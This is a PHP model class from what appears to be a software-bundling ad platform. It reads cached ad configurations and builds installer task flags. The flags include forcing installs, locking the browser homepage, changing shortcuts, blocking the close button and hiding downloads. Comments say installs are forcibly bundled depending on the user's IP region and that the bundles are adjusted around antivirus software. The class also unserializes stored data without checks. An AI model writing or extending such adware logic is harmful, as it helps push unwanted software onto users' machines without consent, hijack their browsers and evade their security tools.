<?php namespace App\Models;
use App\Models\Material as Material;

class TestAd {
	private $materialObj = null;

	public function __construct() {
		$this->materialObj = new Material();
	}

	public function getById($id) {
		if(intval($id) <= 0) {
			return false;
		}
		$ad_cache = app('db')->table('ad_cache')->where('id', $id)->first();
		if(!$ad_cache) {
			return false;
		}
		$data = unserialize($ad_cache->content);
		if(empty($data['extra'])) {
			return $data;
		}

		$data['extra'] = $this->getExtra($data['extra']);
		return $data;
	}

	public function getExtra($data) {
		$data['ChkCapColor'] = str_replace('#', '$FF', $data['ChkCapColor']);
		$data['ChkTipColor'] = str_replace('#', '$FF', $data['ChkTipColor']);

		$data['bChangeLnk'] = $data['bChangeLnk'] << 1;
		$data['bLockHomePage'] = $data['bLockHomePage'] << 2;
		$data['bOpenFolderInstall'] = $data['bOpenFolderInstall'] << 3;
		$data['bShowGrayChk'] = $data['bShowGrayChk'] << 4;
		$data['bHideExtend'] = $data['bHideExtend'] << 5;
		$data['bDisableClose'] = $data['bDisableClose'] << 6;
		$data['bDownHideToTask'] = $data['bDownHideToTask'] << 8;
		$data['bDownToDesktop'] = $data['bDownToDesktop'] << 9;

		$data['taskset'] = $data['bForceInstall'];
		$data['taskset'] |= $data['bChangeLnk'];
		$data['taskset'] |= $data['bLockHomePage'];
		$data['taskset'] |= $data['bOpenFolderInstall'];
		$data['taskset'] |= $data['bShowGrayChk'];
		$data['taskset'] |= $data['bHideExtend'];
		$data['taskset'] |= $data['bDisableClose'];
		$data['taskset'] |= $data['bDownHideToTask'];
		$data['taskset'] |= $data['bDownToDesktop'];
		return $data;
	}

	public function getProcessData($ip, $sdSoft, $id) {
		if(intval($id) <= 0) {
			return false;
		}
		$data = $this->getById($id);
		if(empty($data)) {
			return false;
		}

		$this->materialObj->setList($data['content']);
		$this->materialObj->doCityInstall('202.106.212.226');// 区分IP强制捆绑
		$this->materialObj->doAntBlock($sdSoft);// 处理不兼容杀毒软件
		$data['content'] = $this->materialObj->getList();
		
		return $data;
	}
}
